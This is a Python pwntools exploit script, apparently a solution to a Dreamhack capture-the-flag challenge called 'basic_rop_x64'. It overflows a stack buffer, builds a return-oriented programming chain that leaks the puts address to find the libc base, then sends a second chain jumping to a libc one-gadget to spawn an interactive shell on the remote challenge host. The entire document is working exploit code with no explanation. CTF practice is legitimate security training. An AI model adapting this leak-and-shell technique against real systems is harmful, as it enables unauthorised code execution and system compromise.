#!/usr/bin/env python3

from pwn import *

exe = ELF('basic_rop_x64', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+94
        c
        b*main+62
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 21978)
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak libc
pop_rdi = 0x0000000000400883
payload1 = flat(
    b'A'*8*8,
    b'B'*8,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'],
    )
sl(payload1)

p.recv(0x40)
puts_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = puts_leak - libc.sym['puts']
info("Puts leak: " + hex(puts_leak))
info("Libc address: " + hex(libc.address))

### STAGE 2: Get shell
pop_csu = 0x000000000040087b
binsh_addr = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.sym['system']
payload2 = flat(
    b'A'*8*9,
    pop_csu,
    0x6010d8,
    0,
    0,
    0,
    0,
    libc.address + 0xebd52,
    )
sl(payload2)

p.interactive()
